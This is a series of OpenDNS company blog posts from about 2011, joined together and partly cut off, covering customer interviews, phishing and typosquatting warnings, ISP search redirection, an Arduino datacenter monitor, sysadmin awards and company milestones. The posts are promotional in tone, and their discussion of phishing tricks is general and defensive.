As expected, when we put proper precautions in place, including OpenDNS, there was an immediate improvement.\nOpenDNS:  What’s the best tip you can offer to computer and Internet users for avoiding costly IT repairs?\nTM: Security. If you make sure your machine is patched with the latest updates for your software and a current anti-virus installed, and add OpenDNS to the mix, you’ll find most problems are prevented in the first place. Beyond that, I’d advise not to install applications or free software that you don’t need.\nOpenDNS: What about a tip for small businesses who can’t afford an in-house IT person?\nTM: Find a local IT support company that offers proactive, unlimited support. This way you get the benefit of having a whole team of specialists to look after your IT. Just make sure the service is unlimited. That way your IT support team is motivated to prevent issues rather than wait and charge by the hour for fixing the inevitable.\nOpenDNS: What’s one thing people should do before picking up the phone to call their IT guy when they think there’s an issue?\nTM: Turn it off and on again. It probably seems too simple to work, but you’d be amazed the amount of people who call us with problems that a simple reboot would fix.

Being able to see the numbers causes everyone to think about their contribution to the metrics that matter and how they can have a positive impact on the company (less support requests, improved performance, better traffic engineering, etc.) I believe looking at the numbers can guide a business unfailingly — Numbers don’t lie (though their interpretation is often a good fodder for debate!).\nToday I’m delighted to report some exceptional numbers.  OpenDNS has recorded its two biggest weeks on record.  We are now regularly handing over 32 billion requests per day during the week (some of you seem to take a break on weekends). Best of all we’ve done this with zero downtime, as we’ve never had downtime in our entire company history.\nI believe in our mission unwaveringly of making the Internet safer, faster and more reliable. And I can’t thank our users enough for their support of that mission. Also can’t wait to share more the cool stuff we’re cooking up.\nPS — Some of you have already asked me about what we’re using for our KPI dashboard.

So we’re often the first to see new, particularly sneaky phishing attacks. The one we’re sharing with you today is both of those things.\nAt the surface, this scam looks like hundreds of thousands of others we’ve seen over the years. It impersonates an HSBC Bank website and encourages people to enter their login credentials, which would then, presumably, be stolen and used nefariously. While any kind of phishing is gross, it’s what’s happening behind the scenes here that’s particularly alarming.\nSimply put, the scam actually turns 404 errors into phishing websites. So this phishing website returned 404 headers to your browser, which normally tell your browser that the website you’re trying to load is down or can’t be found.  Instead of saying a page couldn’t be found, their “error” page just looked like HSBC Bank’s website to visitors.\n\nThe reason this is especially crafty is that it completely circumvents one of the primary ways PhishTank tests if a phish is still live and functional, which is watching for 404 errors. Normally a 404 would only be returned after the offending website was fixed, indicating the content is no longer available.  However, a website administrator can put whatever content they want on their 404 error page.  This is exactly what we saw happen. By returning a 404 error, but still rendering the phish, the website administrator avoided being caught by Phishtank. But not for long.\nOur exceptional community of security researchers, IT professionals and academics, quickly identified the phish and verified it, blocking it for more than 30 million people around the world instantly. And OpenDNS engineering is working now to update the way PhishTank works to make sure we catch these types of phishes without delay going forward.\nThe moral of the story here, and the moral to every story about Internet security: the bad guys are crafty and constantly trying new ways to trick Internet users. Security companies like OpenDNS need to be vigilant and work with the security community to quickly react to threats and always stay ahead of the bad guys.

To get some insight, we talked to Jonathan Rhodes, IT Consultant for the Cole YMCA.\nOpenDNS: Kids are more connected then ever these days. How do you help kids balance active choices with the time they spend online?\nJR: It’s been my experience that kids will choose to be active if the option is there. At the YMCA, I often see kids playing basketball after putting their backpacks down in the stands. Classrooms are getting more and more technologically sound and because they are surrounded by technology all day they seem to appreciate the opportunity to set it aside to run around and play with their friends.\nOpenDNS: What trends do you see in kids using the Internet while away from home?\nJR: You might be surprised to hear this but one thing that really impresses me about the kids I observe on our network is that they make really responsible choices. Our local high school provides some of its students with laptops to take home and I see many of them using our free Wi-Fi to finish up homework assignments or do research before hitting the basketball courts or the pool. The schools trust the kids to use technology responsibly, and since we go one step further and protect our networks with OpenDNS, it’s easy for them to focus on schoolwork.\nOpenDNS: What can facilities like yours do to help parents understand the importance of Web security for their homes?\nJR: While the children are in the YMCA their browsing is protected from malicious sites and adult content. This is as much for the protection of our network and guests’ equipment as it is for the parents’ peace of mind. We let parents know how we filter content so it’s easy for them to replicate the same OpenDNS filtering settings at home, but we also want them to teach them about Phishing and malware.\nOpenDNS: Why do you love working at the YMCA?\nJR: I came to the YMCA for the first time at age 25 and this place has had such a positive impact on my life. Everything about the YMCA is geared toward health and wellbeing. Whether I’m installing network computing equipment and making choices on the best security and content management programs to support it or I’m coming for a strength training workout, I just love being here.\nOpenDNS: What are your favorite offline activities?\nJR: I enjoy strength training at the YMCA, as well as spending time with my family, and reading tech news.

Does using a service like OpenDNS open the door for discussions about safe Internet browsing?\nRB: Absolutely. As soon as our five-year-old starts reading I will show her the basics of the Internet. My biggest objective is keeping her safe online.  And not just from adult content but also from malware or anything else that may catch a kid off guard. I absolutely love that OpenDNS makes that job much easier!\nOpenDNS: A new puppy, a five year old, and a new baby on the way!

It’s all about finding a balance that makes the family happy, and while I’d love to say I have it all figured out, every day is a learning experience. I try and be strategic, though. For example, while the kiddo is getting ready for school in the morning, I have some time to catch up on email.\nOpenDNS: You’ve found time to do some cool things with WordPress, an open source blog platform. Why are you such a fan of the service?\nRB: Aside from building a cool WordPress plugin, I also maintain installations for family and friends, including my dad, sister and folk musician Adrienne Young. I am overjoyed that blogging has given a voice to so many people, and it’s a great feeling to host, tweak and sometimes even fix the blogs that give them that outlet.\nOpenDNS: We hear you’re a gamer, too.

It banks on the idea that a fast-fingered typist may not notice that she’s arrived at the unintended site due to an omitted “i”. And since the typo exists in a real, registered domain, we don’t interfere.\nTwtter.com is a particularly tricky example. In the case of this site, the typo — an omitted “i” — might not even be apparent at first glance.  The people who run this site are clearly trying to capture typo traffic destined for Twitter.com.  And regardless of the fact that the site has a URL redirect (the domain in the address bar changes after the site has been resolved), the blatant use of Twitter’s well-known design themes prove the site is aiming to fool people into thinking it’s the real website of Twitter.\nTyposquatting is not new, but this sort of high-polish, branded version seems to be on the rise.  In the case of Twtter.com, the Twitter.com imposter, the site’s entire function is to get your contact information. A very appealing offer is presented to answer two survey questions and get what is, by all accounts, an awesome prize: an iPad2. It’s unclear what will happen with your personal information once it’s in the wrong hands — it could range anywhere from being used to send SMSs to your cell phone that you get charged for or simply selling your email address.\nAs with any online threat, protecting yourself and those people using the networks you manage starts with education.  Here are three tips for outsmarting typosquatting:\n1. Use OpenDNS:  It’s the only service that will automatically correct common typos in TLDs, and help ensure you end up at the website you want.  OpenDNS solves a large portion of the problem, and also automatically blocks phishing websites.\n2. Watch the address bar:  Legit websites rarely do redirections like Twtter.com does.  Keep an eye on what the site is doing and note suspicious redirects.  Also simply note the URL of the website you’re visiting after you’ve been taken there. Is the site the one you wanted? Did you make a typo?\n3. Don’t share your personal information:  If a website offers you a chance to win a prize, simply for providing personal information or taking a survey, be skeptical.  You should never share your personal information online unless you’re on an extremely trusted website.\nFor businesses, schools and households alike, online safety is of the utmost importance. And it’s all about education.  Know what to look for and you can outsmart much of the bad stuff.  And use OpenDNS and tell others to do the same.\nWe’d love to hear your thoughts:  We’re considering an opt-in service that would let people avoid these kinds of unintended redirections.  Even in cases like that of Twtter.com, where technically it’s a real, registered website.  What do you think?  Would you use such a service?', 'Security 101', 'https://umbrella.cisco.com/blog/2011/09/02/theres-no-i-in-twtter-how-to-outsmart-typosquatting/');

And usually they’re talking about high-school and college students! To learn more we reached out to Brandon Halsey, 20, of Crown Point, Indiana, who has set-up OpenDNS on machines for dozens of friends and family members and was considered the resident IT pro for his family by the time he was in middle school.\nOpenDNS: How did you discover OpenDNS?\nBH: When I was a freshman in high school I was messing around with a 2003 R2 Windows server to try and understand how it worked. I did some Internet research for a free recursive DNS server and came across OpenDNS. Even though you had just launched at that time, everything I read pointed to how OpenDNS was a faster and more reliable choice for DNS. I gave it a shot and immediately saw a difference from what my ISP offered. I’ve used it ever since.\nOpenDNS: Whoa, back up. You discovered OpenDNS when you were a freshman in high school! Just when did you get into computers?\nBH: I was in 5th grade when we got our first machine that ran Windows XP. I’ve always been curious, so I started tinkering around to see what I could learn about computers. I usually just play around with a computer or server until it breaks and then teach myself how to fix it. By the time I was in middle school I could completely reinstall Windows and fix most common problems. I got my CompTIA A+ and Network+ certifications when I was a junior in high school and just this year I got my “Microsoft Technology Specialist: Configuring Window 7” certification.\nOpenDNS: That’s impressive! I know you’ve been helping teach older generations in your family about Internet security. Do you see that as a bigger trend?\nBH: Definitely. Kids today start using the Internet for learning games when they’re not even in preschool, so it would make sense that they’d grow up to be more tech-savvy than their parents and grandparents who are less experienced with what is still a fairly new technology. I’ve set up OpenDNS on dozens of computers for my friends and family members who didn’t even know they had a choice in DNS (or what it was) and they’ve all thanked me for a faster Internet and protection from Internet threats. I see the trend continuing firsthand: Since I’ve left for college my little brother Nathan has taken over my role as resident IT guy at home.\nOpenDNS: Any alarming stuff out there that you’re surprised to find most parents and grandparents aren’t even aware of?\nBH: I would have to say that the biggest threat to my parents’ and grandparents’ generations is phishing. Though I am constantly telling them not to click links in phishing-style emails or log in to websites without double-checking the URL, the best way I help them combat phishing is to set up OpenDNS. I can count several occasions where I’ve gotten phone calls from family members asking why a seemingly upstanding website was blocked by OpenDNS and I’d have to explain to them what phishing is and how they were protected.\nOpenDNS: When you’re not saving the planet from phishing attacks one friend or family member at a time, what do you do for fun?\nBH: When I’m not busy fixing computers or studying, I am usually messing around with the rack server I recently acquired. I like to use it for experiments to see what I can learn without disturbing my current network setup. Lately I’ve been messing around with things like Group Policy and Active Directory that can save network administrators loads of time and money. I’m not all computers all the time, though.

What’s being alleged is that when the ISP customer types something into his or her own browser address bar, instead of making a DNS request or sending the traffic to the browser-configured search provider, the ISP decides which page the customer is taken to and just sends them there. Last week New Scientist magazine broke the story about the findings and caused a stir across the Internet, which has also prompted Congress to take a look, potentially calling some of these ISPs and bad actors in front of the new Congressional Subcommittee on Privacy, Technology and the Law.\nKeyword redirection is something new we’ve not seen before, and it’s particularly pernicious, but the practice of ISPs somehow trying to shake more nickels out of their customers is certainly not new. It’s happened before here and here. There are some technical similarities to what we do and what these ISPs are doing, though our methods and motives could not be more different. One of the most important differences relates to choice — everyone chooses to use OpenDNS but most people, if they are lucky enough to have access to broadband at all, only have one choice of ISP.\nOur goal at OpenDNS is to help protect people from exactly this kind of security and privacy violation, be it from a malicious hacker or even your ISP. In fact, one of the great ironies in this saga is that while we have never done the things the ISPs are being accused of, we did pioneer some of the techniques that ISPs are using to accomplish this redirection. That doesn’t make us very happy.\nEverything we do at OpenDNS has been with our users’ best interests in mind. We’ve always operated an opt-in service with the sole aim of making you thrilled about using it. Using OpenDNS provides you a healthy level of insulation and privacy between you and your ISP. In the case of the newly-found keyword redirection, switching to OpenDNS empowers you to regain control over your address bar. With OpenDNS enabled, the ISP-controlled keyword redirection stops happening and your address bar searches go back to taking you where you want them to.\nI fear the keyword redirection the ISPs are being accused of doing is only the beginning, as we’re seeing more and more evidence of ISPs doing things (that most would agree) they shouldn’t be doing. Even if you use OpenDNS and the ISP keyword redirection fails, it’s unclear whether ISPs are still able to sniff your traffic and create a profile about your Internet use – a blatant privacy offense. The idea of anyone, including your ISP, spying on your traffic raises serious security and privacy concerns.  We fully intend to follow this closely and continue to help you do something about it.\nYou can be sure we will respond by delivering even stronger solutions that protect your security, privacy and ability to use the Internet unencumbered anywhere in the world, on any device, at any time.', 'Announcements', 'https://umbrella.cisco.com/blog/2011/08/10/isps-hijacking-search-keywords-using-dns-2/');

I love steampunk as much as the next guy but it just didn’t feel right for this project.\nArduino driven.  It has been a year since my last Arduino project and it’s time to get back to my favorite little microcontroller. There are also a few other people playing with Arduinos at OpenDNS – not so many using picaxe or MSP 430s .\nExpandable – not everything has to be done at once but a little work now gets me more to play with later. I used RGB tri-color LEDs but only connected the red channel for the first iteration.\nGet others involved –  I work with brilliant software engineers.  If I provide them with instructions on how to send data to the panel over USB, they will do a much better job than I ever could. While this write up is about my work, it was awesome to work with engineers Doug Tabacco and Adam Phelps on this project.\nParts\nPre-finished Birch Plywood – cut to 18″x24″ pieces to fit on the laser bed.\nArduino – I had an Arduino Mega sitting around but it’s overkill for what I need.  I need lots of PWM outputs and the Mega only has 13.\nTI TLC5940 LED Drivers – I daisy chained two of these chips to drive up 32 PWM/analog outputs. Each chip is about $4 and there is a good library with plenty of examples of Arduino+TLC5940. The one odd thing is that the 594o controls the individual cathodes (negative) so all the LEDs have to be common anode.\n5mm common anode RGB Leds – I am only controlling the red channel with fading for now but will hook up the rest of the colors later to allow color changes.\n0-5v gauges – the Arduino+TLC5940 can drive up to 5v which makes these voltmeter panel gauges  ideal.  I originally tested on a 0-1A gauge with the shunt cut off but having 12 identical gauges already set up for 5v made the project much simpler.\nMisc – a little bit of glue, some 22AWG wire, 22AWG butt crimps, tap splices and a breadboard.\nMap\n\nLaser etching can be done in one of two ways: Raster and vector.  While raster mode allows for fill and shading, vector mode etching cannot be beat for detail and sharpness.  Vector etching provides a 0.005″ (0.13mm) lines with curves rendered at 1200 dpi.   The trick is to run the vectors with #FF0000 line color at 100% speed, 10% power whereas the black vectors would cut at 20% speed, 90% power on a 60 Watt CO2 laser.\nThe world map needed to vector etched but the original file (http://www.vectorworldmap.com/) had every tiny little island as a barely visible vector form. In my test etching I found that the even with a laser cutter’s precision, there was heat spread in the wood causing charring! Sorry to our friends in Alaska and Western Europe but I had to hide some of the tiny islands.\nI found the locations of our data centers on the map and added mounting holes for the LEDs.  Since I am using nice 5mm RGB diffused LEDs, I wanted to show them off.  Instead of drilling a single big through hole for the LED body, I  decided to laser cut a hole for each lead (Red, Anode, Green, Blue). Each hole is 0.5mm in diameter with .75mm spacing between holes. This aligned the leads perfectly and snugly allowing me to attach wires from the back.\nGauges\nThe gauges are voltmeters that measure 0-5v DC. I originally planned on replacing the face of the gauges but the stock gauges looked so good I didn’t bother. The ambiguity of 0-5 only seemed to add to the overall effect. I used calipers to measure the gauges and design a mounting through hole for laser cutting into the wood.  I always test my designs by first laser cutting them into cardboard so I can find all the little flaws.  To my surprise, the first iteration was a perfect fit!\nConstruction\nI have been playing with box joints for a little while and really like the contrast of laser charred edges against a  light birch face. I got my settings dialed in to the point that I was getting a dovetail-like fit. In fact the boxes you see here are incredibly hard to disassemble.\nFor this project, I will be assembling and disassembling frequently so I adjusted my settings to make for a looser fit.\nThe laser cutter at TechShop San Francisco has an 18″ x24″ bed.  This is a great size but scaling the world map  to fit in that space with enough room for two rows of gauges left New York and Washington DC so close together that the LEDs would be touching. I needed to scale up.\nSince I have 24″ on one end I decided to make the case 23″ x 23″ x 6″.  The 23″x6″ sides/top/bottom cut easily.  I then split the back into two pieces and the front into three pieces. By keeping the front modular, I was able to permanently glue the sides, top front and bottom front but allow the middle front and back to be removed.  Why leave that extra space in the middle?  I’m not sure yet but I think there may have to be some rocker switches, buttons and dials added to the panel in the future.\nAssembly and Wiring\n\nThis picture pretty much tells it all.  The clamps were probably unnecessary since the finger joints were holding just fine but one can never be too careful. The only part missing from the shot is the Arduino that sits along the bottom along with a breadboard holding two TLC5940 chips. Notice the hole in bottom left for USB cord.\nFinal Assembly\n\nHot glue used to hold wires in place. I reversed colors (oops) and the common negative/cathode is black for the LEDs.\nTiny butt crimp connectors attach the LED leads to the wires. You’ll also notice the red wire taps to attach common anode. Electrical tape is covering up the unused green and blue pins.\nArduino and breadboard are attached to the bottom of the case using foam tape.\nI couldn’t be happier with how it turned out! The monitoring station now sits at the front of our office for everyone to see.\nSerial Communication\nThe Arduino makes serial communication pretty simple. The two tricky parts are keeping the serial connection open and debugging.  I settled on the format of three digits and a character to indicate which location (LED+Gauge) was being updated.  For example, updating Amsterdam to 100% (gauge pinned at 5, LED glowing brightly)  send 100A or 050A for 50%.\nAt this point, uber-engineer and friend Doug Tabacco  took over and wrote the control software.  The laptop does all the heavy lifting of  fetching stats and scaling/normalizing. His python script scrapes the per-site stats data, normalizes it to a % value and sends that value over serial every 0.085 seconds.\nBugs\nEverything seemed to be fine but then a strange thing happened: after a few minutes of testing, Doug’s Mac’s USB port stopped responding until it was rebooted.   I was starting to freak out because the Sysadmin Appreciation Day party was only 5 days away and this was more than just a little weird glitch.\nMy first assumption was that there was something wrong with the Arduino.  Then after a good night’s sleep I realized I forgot to comment out one of my debug serial outputs in the Arduino code.  The Arduino was sending a line of serial output every .085 seconds (12 outputs per second)… yep, that’s how you fill a buffer and cause weird things to happen. After commenting out that output line in the Arduino code, Doug’s script worked perfectly!\nNote: This is a cross post from my personal blog at www.nerdkraft.com', 'Community', 'https://umbrella.cisco.com/blog/2011/08/03/opendns-datacenter-monitoring-station/');

We’re in awe of this work, but we still think he humbly tells it best: “I have been a light bulb replacer, a surge protector switcher-on guy, a virus fixer, a heavy box delivery man, a server installer, an iPhone troubleshooter, a network architect and more… my name is Eric, I am IT, and I fly solo.”\nLarge-Scale Deployment Award\nRyan Pierce was the stand-out winner for the large-scale deployment award because faced the difficult challenge of implementing a system-wide upgrade across dozens of healthcare facilities throughout California. He did so with limited support resources, an executive team that didn’t see value in an IT department, and the responsibility of simultaneously handling all IT tickets for the organization! Now, he boasts the trust and support of the executive team, HIPAA compliance, and the successful completion of a $1.5M upgrade.\nDevOps Award\nThis was an easy one. Elite SysAdmin and engineer Richard Crowley cut his teeth at OpenDNS, where he learned a massive amount about operations and systems. We couldn’t be more proud of his new tool and venture, blueprint, and Richard couldn’t be more deserving of this award. Blueprint allows users to reverse-engineer running servers, output a blueprint, and recreate the server. The tool has already helped numerous SysAdmins quickly take existing machines and add them to automation frameworks. Plus, it’s completely open source, free, and available at Github.com, where more than 800 people are following its progress. A perfect fit for the DevOps award.\nNeat Freak Award\nIf this year’s nominations are any indication of industry standards, it appears that the freakishly neat are multiplying! From the countless nominations we received there was one clear standout. Thanks to David Korté’s painstaking network diagramming, his server racks look like a work of art.\nOur amazing list of winners will receive a bounty of gifts fit for a SysAdmin. Their prize package includes caffeinated treats from ThinkGeek, OpenDNS swag, and perhaps most importantly, bragging rights to their friends and colleagues.\nThank you to everyone who entered and raised the bar for the 2011 OpenDNS SysAdmin Awards.', 'Announcements', 'https://umbrella.cisco.com/blog/2011/07/29/drumroll-please-announcing-the-2011-opendns-sysadmin-awards-winners/');

We’ve come so far and have much to be thankful for.\nIn 2005, before launching OpenDNS, I went to talk with some of the leading DNS experts to get feedback — and the feedback I received was consistent. They didn’t think what I wanted to do was even possible, and if it was possible, they didn’t think anybody would want it.  Smart guys, but wrong on both counts.\nToday, we are the largest DNS service in the world with more than 30,000,000 users. 30,000,000!  And we’ve never had a global outage.  If we were an ISP, we’d be one of the largest in the world.\nWe compete against Google, which launched a service following ours in 2009. And we’re winning.  We compete against Symantec, a $14 billion dollar company that has watched us build market-share with consumer and enterprise customers who prefer OpenDNS as a security solution.  And we make the Internet safer, faster and more reliable for more than 1% of the world’s Internet users.\nWe’ve done this with your help, your feedback, your evangelism, and your encouragement.  And that’s why we thank you, and make sure to put you first with everything we do.\nSome Major Milestones:\nIn July 2006, we opened our doors and let in the first packets, within a month, we handled a total of over 1 billion DNS queries.  Today we handle over 30 billion a day.\n\nIn April of 2009, not quite 3 years after our launch, we handled 10 billion queries in a single day.  We are supersonic at this point!\n\nIn the summer of 2009 — skipping our vacation — we pushed our mission of a safer, faster Internet for everyone forward with our good friends at NETGEAR to deliver Live Parental Controls and OpenDNS across millions of households.\n\n2009 ended with the launch of OpenDNS Enterprise, our service to deliver a safer Internet to businesses small and large around the world.  Today we have some of the largest companies in the world on our enterprise platform.\n\nIn June of 2010 we discovered that 1 out of 3 public schools in the US was using OpenDNS to provide a safer and faster Internet to students across America.  Today, we see over 40,000 schools around the world!\nJuly 2011 welcomes our fifth birthday and our announcement that we now have more than 30,000,000 people using OpenDNS every day.  And based on our numbers, the countdown to 40,000,000 isn’t far away.\nThe Road Ahead\nWe’re a startup and we move fast.  It’s easy to lose sight of the big picture when you’re heads-down, focused on an immediate product launch or set of features.  In order to make sure we stay on course, we have a few perspectives shaping the decisions we make.\nSpeed and reliability matter more than ever.  The number of people connected to the Internet around the world continues to grow at an astounding rate and the desire to access content quickly, safely and securely has only increased.\nWe look at the major security companies like Symantec, Websense, Blue Coat and others and see major gaps in their offerings and we think there is a better way to secure the myriad devices connecting to our customers’ networks.\n\nWe know that despite tons of various malware solutions in the market, they all stink for one reason or another.\n\nWe know that people care about privacy, but if you ask 100 people to explain what privacy means you will get 100 different answers.\n\nWe know there are a lot of different devices connecting to the Internet now and having custom software deployed for each version of Android, iOS, Windows or Mac is unmanageable.\n\nWe believe in defense in depth as the only sound security strategy and we want to help our customers practice it.  We are sympathetic to the CIO who doesn’t want ten different security solutions on his or her network, but history has shown that the magical security appliance that does everything will let you down every time.\nThank You\nOpenDNS is poised for even more stratospheric growth in the next five years.  As a company, we are becoming more mature in our thinking, and our goals continue to expand.  With each hill we climb, the horizon of our potential positive impact continues to broaden.\nAs an engineering-driven company, we’re lucky to have assembled such an amazing engineering organization that delivers our non-stop service.  We have consistently recruited amazing people, and managed to raise the already-high bar with every new hire.\nI speak for everyone on the team here when I say: Thank you for using OpenDNS!\nPS, we’re running an amazing infographic of OpenDNS statistics on our homepage for a couple days, but here’s a link to it in case you miss it.', 'Announcements;Milestones', 'https://umbrella.cisco.com/blog/2011/07/27/22-trillion-dns-requests-later-opendns-turns-five/');

After a ten year stint in India as a programmer and engineer for notable software companies, he now works for Verizon Data in the U.S. as a technical architect.\n1) As far as we can tell you know pretty much everything about technology. How did you discover OpenDNS?\nOn the Internet you can find anything under the sun. However, it also carries weird distractions and eerily scary whirlpools. I had been using K9 Web Protection on my desktop and from their forums I learned about OpenDNS. It immediately seemed to me that OpenDNS was a more powerful way to keep unsafe Internet sites and software from getting downloaded in my living room. OpenDNS was obviously a faster, fault-free, fail-safe, and smarter name resolution service.\n2) Wow. I bet we have a lot of OpenDNS converts to thank you for! How are you using OpenDNS today?  \nEverywhere! I’m not exaggerating when I say that most of my friends would rather give up the Internet than go without OpenDNS protection. I use OpenDNS on my home computer, my wife’s laptop, the computers of my parents and sister back home in India, and have worked with our SysAdmin to get OpenDNS rolled out to Verizon’s offshore offices in India. I love the Phishing protection and the lightening-fast page load speed.\n3) We know from your engagement on our Facebook page that you’re quite a savvy social networker. What do you think of Google+?\nGoogle Plus is a definitive futuristic social networking solution that is more a compliment to or healthy contestant with Facebook than an arch rival. Google has innovation built right in its kernel and its innovation helps us to be more creative. Given the previous experiences Google had with Buzz, Orkut and Wave, I am sure Plus is going to be a radically new, rewarding and secure approach.\n4) Lots of big companies now leverage social networking for customer support and engagement. What’s your take on that approach?\nCustomer support is all about developing a healthy relationship between the enterprise and the customers. Social Networking websites like Facebook help save the time for both the enterprise and customers by leveraging an existing common platform to meet and collaborate. Heightened visibility means customer needs are addressed more quickly and effectively. Plus, one great by-product of customer support in these public social venues is that customers and users are often motivated to provide peer-support and end up becoming part of a bigger solution.\n5) From where we sit it looks like you’re always working. How do you unwind?\nEven my non-tech hobbies seem to lead me back online. I have two blogs: one focused on personal, day-to-day experiences and the other focused on my own spiritual growth. I also enjoy experimenting in the kitchen with various veggie delights and ice cream recipes.

More importantly, these devices are not being provisioned by the IT folks, but are being brought in by the employees.  iPads, iPhones, Droids, Tablets and others are connecting into the enterprise network. Unlike a decade ago where IT could easily say no to an unmanaged device, it’s harder today when everyone wants to use one, including your CEO.\nAs the IT guy or gal, it’s your job to both protect the network and make it accessible, two roles often at odds.  I’ve discovered that many of you are using OpenDNS to provide malware and botnet protection, along with all our other services, to help protect these devices.  Since our service lives in the network, it doesn’t require any on-device client software and we don’t care if you’re running iOS 4.3 or 5.0 — or Android Froyo or Gingerbread.  Our protection is device agnostic.\nIt turns out though, we aren’t the only ones seeing this trend.  Analyst firm IDC published a study this week on this exact topic, the consumerization of IT.  They note that employees are increasingly using laptops, smartphones and tablets to get work done.\nIn addition, increasingly those employees are working in coffee shops, on airplanes, even while traveling in cars (as passengers, of course).  Traditional security appliances and services weren’t designed for this. It’s an IT problem for companies, which means it becomes a problem for network admins, everywhere.\nI am interested in these kinds of studies because I know that OpenDNS is a solution.\nFor those new to our service, OpenDNS provides a simple malware blocking service that’s more powerful than anything else available. By simply pointing to our IPs and configuring your settings in our web-based dashboard, you can immediately protect your network.\nBack to the study.  Some impactful, but not altogether surprising, stats:\n83% of IT people called “Security Concerns” the greatest barrier to actually enabling employees to use mobile devices for work.  (Even though they’re clearly already using them.)\n40% of devices used to access business applications are personally owned in 2011, up from 30% in 2010.\nOnly 50% of employees reported their desktop PC as the most critical business device in 2010.  But even less, only 35% expect it to be in 2012.\n74% of IT people consider employee-provided tablets as a security threat.\n80% of IT people described security as an “Urgent” concern.\nLastly, Stacey Higginbotham over at GigaOm, published a neat infographic of the major stats from this study.

It will block more forms of malware, and make networks around the world much more secure from costly malware infections.  In addition to blocking malicious hostnames, we now block hostnames that resolve to known malicious IP addresses.  That’s a big step forward, so I’ve added some notes on why this an important step for us.\nFirst, some background: OpenDNS Enterprise malware protection is unlike anything else available. It’s a game-changing service for network admins tasked with keeping malware off their networks. It’s the first and only product that serves the two critical needs in fighting malware: blocking infections and mitigating compromised hosts.\nHere are three excellent reasons you should consider using it:\nReason #1: Disable, Don’t Just Try to Detect\nMainstream anti-malware services from traditional companies like Microsoft and Symantec do little or nothing once a machine is infected to mitigate the damage that the malware causes. OpenDNS Enterprise malware protection, on the other hand, works to both prevent and mitigate malware. Since you can be infected through a variety of non-network vectors (USB stick, attachments, etc.) we also work to prevent infected computers from phoning home by blocking the master command and control servers that the malware communicates with.\nReason #2: Do You Run a Firewall or Anti-Spam System?\nSome businesses sometimes ask me why they need OpenDNS. I ask them, “Do you have a firewall? Do you have a mail server with anti-spam and anti-virus enabled?  Do you run an IDS system?” They invariably answer “yes” to all three questions.  So then I ask, “Why do you leave your DNS traffic open like a firehose?  Don’t you want to let in the good and block the bad?”  Most network administrators and IT folks have never considered that problem, but once they do; the choice to use OpenDNS is clear.\nReason #3: Malware is a Major Problem For You, Whether You Realize it or Not\nMalware is a massive problem, and one that’s growing fast. Stats from security firm Dasient show the number of websites infected with malware doubling since last year, with more than one million sites compromised during the fourth quarter of 2010.  Another study from Microsoft shows that one in every fourteen programs downloaded by Windows users are malicious. And despite IE’s built-in warnings, 5% of people download the files anyway.  Stopping infections is only part of the solution, the other part requires OpenDNS.\nInterested?

Like a knight in shining armor, he or she managed to keep the network up and running. Your submission should include details about the disaster and how the SysAdmin handled it.  If it involved you holding servers over your head in rising flood waters while you are wearing a snorkel, you would be a great candidate for this category.\nNeat Freak Award\nSysAdmins take pride in documentation and organization of cabling, wiring and racks. Wow the judges in this category with photographic evidence showing that your SysAdmin takes their wiring and racking work seriously and is the neatest and most organized of them all.\nShoestring Budget Award\nThis SysAdmin works wonders with a seriously tight budget. Tell us about the SysAdmin with the craziest buildout done on the cheap. We need details for this submission – tell the judges specs, total cost and what kind of awesomeness it powers.  We respect the fact that you had to string fiber between buildings with a frisbee because you had no budget to trench across the street.\nFlying Solo Award\nEven with a team of talented operators, SysAdmin’ing is not easy work. But when flying solo it can be downright heroic. Regale us with a (true) story of the heroic SysAdmin who saved the world (or did something awesome) to save the day (or company) all by his or herself.\nLarge-Scale Deployment Award\nSome jobs are too challenging to comprehend, but not for the SysAdmin who wins our Large-Scale Deployment Award. Tell us the story of a SysAdmin who has managed a massive amount of infrastructure from their diety-like fingertips with finesse and elegance. Tell us how big the deployment was, when it was built and what some of the impressive metrics it offered were (pageviews, megahertz, memory, rendering, etc.).

It’s not Facebook, which people use to share personal information, to be sure.  LinkedIn encourages people to build profiles limited to information about their professional lives only, and share the profiles by connecting to business contacts. Perhaps the most helpful use of LinkedIn is when a user is looking for a new job, and can use the site to market him or herself to potential employers and contacts who may refer them for jobs. But professionals also use LinkedIn to connect for their current company’s benefit. To identify appropriate contacts to forge partnerships.\nSo for a network admin, how do you think about LinkedIn?  It’s not particularly bandwidth intensive, so it likely won’t slow your network. Do you feel compelled to restrict access during the workday because it’s a productivity inhibitor?

Overwhelmingly people visit LinkedIn the most between 8 am and 4 pm, with a dramatic decline during non-working hours.\n\nThere are several ways to interpret this data, but one thing is clear: people use LinkedIn during the workday.  And almost exclusively during the workday. My expectation was that the numbers would point to more evening usage – folks spending non-work time polishing up their profiles and making connections, but that is clearly not the case. Next week we’ll take a look at Facebook visits and compare LinkedIn with Facebook.

That means the volume of phishing emails in the morning might not be attributable only to the fact that phishing emails are being sent in the morning.\nSo what it is about the morning hours that’s got so many of us fooled? Perhaps we’re simply more susceptible, more easily fooled in the morning.  Before we’ve had our coffee and gotten our day started. Perhaps it’s because morning is when we clean out our inboxes, looking over email that’s come in the night before.\nAlso interesting is that more clicks on phishing links happen in California than any other US state.  The top five phish-clicking states are here, in order.\nCalifornia\nTexas\nNew York\nIllinois\nFlorida\nFor context, this maps almost perfectly to state population. The only deviation is Illinois, which is actually the fifth largest state. So from this data one might conclude that we’re equally fool-able.

And for good reason.  The methods through which we’re phished have become dramatically more sophisticated in recent years.  Early phishes appeared to come only from banks and financial organizations, but today phishes spoof gaming companies like Zynga, e-commerce sites like Amazon, government organizations like the IRS.

Please note: we are not taking a stance, but rather just aiming to help inform.\nIn the most recent session of Congress collectively both parties introduced 50 new bills related to cybersecurity.  An indication a more cohesive plan and policy is needed, the President decided to draft a cybersecurity bill that addresses protecting the American people, America’s critical infrastructure and Federal Government computers and networks.\nFrom the White House:\n“It has become clear that our Nation cannot fully defend against these threats unless certain parts of cybersecurity law are updated […] We have developed a pragmatic and focused cybersecurity legislative proposal for Congress to consider. This legislative proposal is the latest achievement in the steady stream of progress we are making in securing cyberspace and completes another near-term action item identified in the Cyberspace Policy Review.”\nAs for the “protecting the American people” part, the new Bill will standardize laws about notifying consumers in the event of a data breach. Today there are 47 different state laws in this area.  It will also clarify laws around computer crimes. One of the key tools law enforcement uses today against organized crime is the Racketeering Influenced and Corrupt Organizations Act (RICO).  But today RICO doesn’t apply to computer criminals.  The Bill aims to change that and also sets mandatory minimums for cyber intrusions into critical infrastructure.\nThe “protecting America’s critical infrastructure” part is less clear.  The new Bill will “enable” DHS to quickly help a private-sector company, state, or local government when that organization asks for its help.  And it grants companies and governments immunity 